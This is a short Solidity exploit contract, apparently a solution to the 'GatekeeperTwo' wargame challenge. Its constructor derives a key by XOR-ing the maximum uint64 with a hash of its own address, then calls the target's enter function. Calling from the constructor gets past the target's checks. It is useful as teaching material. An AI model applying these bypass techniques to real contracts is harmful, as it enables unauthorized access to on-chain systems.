pragma solidity ^0.8;

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    constructor(IGateKeeperTwo target) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}
